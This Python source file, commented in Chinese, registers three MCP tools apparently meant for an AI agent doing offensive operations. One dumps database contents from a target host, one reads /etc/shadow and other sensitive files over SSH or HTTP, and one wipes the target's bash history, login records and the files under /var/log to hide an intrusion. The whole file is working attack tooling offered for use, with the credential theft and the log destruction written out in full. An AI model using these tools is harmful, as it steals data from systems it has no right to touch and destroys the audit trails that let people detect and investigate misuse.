#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""数据采集工具 — 数据库数据读取 + 配置信息采集"""
from mcp_runner_helper import run_cmd

def _register(reg):
    reg({
        "name": "db_data_extract",
        "description": "数据库数据采集：读取MySQL/MSSQL/PostgreSQL/Redis数据",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP"},
    "type": {"type": "string", "description": "数据库类型: mysql/mssql/postgres/redis", "default": "mysql"},
    "username": {"type": "string", "description": "数据库用户名"},
    "password": {"type": "string", "description": "数据库密码"},
    "query": {"type": "string", "description": "SQL查询语句（mysql/mssql/postgres用），Redis用info", "default": "show databases;"},
    "port": {"type": "integer", "description": "数据库端口", "default": 3306}
},
                      "required": ["target", "type", "username", "password"]},
    })(tool_db_data_extract)
    reg({
        "name": "file_extract",
        "description": "文件/配置信息提取：读取远程服务器敏感文件",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP（需已连上SSH或已有凭据）"},
    "mode": {"type": "string", "description": "ssh=通过SSH读取, http=通过Web访问读取", "default": "ssh"},
    "paths": {"type": "string", "description": "要读取的文件路径，多个用逗号分隔", "default": "/etc/passwd,/etc/shadow,/etc/hosts"},
    "username": {"type": "string", "description": "SSH用户名（mode=ssh时需要）"},
    "password": {"type": "string", "description": "SSH密码（mode=ssh时需要）"},
    "port": {"type": "integer", "description": "SSH端口", "default": 22}
},
                      "required": ["target", "mode"]},
    })(tool_file_extract)
    reg({
        "name": "cleanup_trace",
        "description": "痕迹清理：删除登录日志、历史命令、临时文件",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP（需已SSH登录）"},
    "username": {"type": "string", "description": "SSH用户名"},
    "password": {"type": "string", "description": "SSH密码"},
    "level": {"type": "string", "description": "level1=基本(清history), level2=中等(清日志), level3=完全(清日志+修改时间)", "default": "level2"},
    "port": {"type": "integer", "description": "SSH端口", "default": 22}
},
                      "required": ["target", "username", "password"]},
    })(tool_cleanup_trace)


# 数据库数据采集
def tool_db_data_extract(name, params):
    target = params.get("target", "")
    db_type = params.get("type", "mysql")
    username = params.get("username", "")
    password = params.get("password", "")
    query = params.get("query", "show databases;")
    port = params.get("port", 3306)

    if not all([target, username, password]):
        return {"success": True, "returncode": 0, "output": "需要target, username, password"}

    if db_type == "mysql":
        cmd = f"mysql -u {username} -p'{password}' -h {target} -P {port} -e '{query}' 2>&1"
        r = run_cmd(cmd, 30)

        # 如果有结果，再拉一次所有表
        output = r.get("output", "") if isinstance(r, dict) else str(r)
        if "databases" in output.lower() or "information_schema" in output:
            all_dbs = run_cmd(f"mysql -u {username} -p'{password}' -h {target} -P {port} -e 'SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA' 2>&1", 15)
            output += f"\n\n所有数据库列表:\n{all_dbs.get('output','') if isinstance(all_dbs,dict) else str(all_dbs)}"

        return {"success": True, "returncode": 0, "output": output}

    elif db_type == "redis":
        r = run_cmd(f"redis-cli -h {target} -a {password} INFO 2>&1 | head -30", 10)
        r2 = run_cmd(f"redis-cli -h {target} -a {password} KEYS '*' 2>&1 | head -20", 10)
        out = r.get("output", "") if isinstance(r, dict) else str(r)
        out += f"\n\nRedis Keys:\n{r2.get('output','') if isinstance(r2,dict) else str(r2)}"
        return {"success": True, "returncode": 0, "output": out}

    return {"success": True, "returncode": 0, "output": f"不支持该数据库类型: {db_type}"}


# 文件提取
def tool_file_extract(name, params):
    target = params.get("target", "")
    mode = params.get("mode", "ssh")
    paths_str = params.get("paths", "/etc/passwd,/etc/shadow,/etc/hosts")
    paths = [p.strip() for p in paths_str.split(",")]
    username = params.get("username", "root")
    password = params.get("password", "")
    port = params.get("port", 22)

    results = []
    for path in paths:
        if mode == "ssh":
            if not password:
                continue
            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {username}@{target} 'cat {path}' 2>&1"
        elif mode == "http":
            cmd = f"curl -s --max-time 5 http://{target}/{path} 2>&1"
        else:
            continue

        r = run_cmd(cmd, 15)
        content = r.get("output", "") if isinstance(r, dict) else str(r)
        if content and "Permission denied" not in content and "Connection refused" not in content:
            results.append(f"=== {path} ===\n{content[:500]}")

    if not results:
        return {"success": True, "returncode": 0, "output": "未能读取任何文件。确认SSH凭据正确或HTTP可达"}

    return {"success": True, "returncode": 0, "output": "\n\n".join(results)}


# 痕迹清理
def tool_cleanup_trace(name, params):
    target = params.get("target", "")
    username = params.get("username", "root")
    password = params.get("password", "")
    level = params.get("level", "level2")
    port = params.get("port", 22)

    if not password:
        return {"success": True, "returncode": 0, "output": "需要SSH密码"}

    cmds = []
    if level in ("level1", "level2", "level3"):
        cmds += [
            "history -c",
            "rm -f ~/.bash_history ~/.zsh_history",
            "export HISTSIZE=0",
            "rm -f /tmp/* 2>/dev/null; rm -f /var/tmp/* 2>/dev/null",
        ]
    if level in ("level2", "level3"):
        cmds += [
            "sh -c '>/var/log/wtmp' 2>/dev/null",
            "sh -c '>/var/log/lastlog' 2>/dev/null",
            "rm -f /var/log/secure* /var/log/messages* /var/log/syslog* 2>/dev/null",
            "rm -f /var/log/auth.log* /var/log/boot.log* 2>/dev/null",
        ]
    if level == "level3":
        cmds += [
            "find /var/log -type f -exec sh -c '> {}' \\; 2>/dev/null",
        ]

    full_cmd = " && ".join(cmds)
    if not full_cmd:
        return {"success": True, "returncode": 0, "output": "未知级别"}

    r = run_cmd(f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {username}@{target} '{full_cmd}' 2>&1", 30)
    output = r.get("output", "") if isinstance(r, dict) else str(r)
    return {
        "success": True, "returncode": 0,
        "output": f"=== 痕迹清理: {target} (level={level}) ===\n{output}"
    }
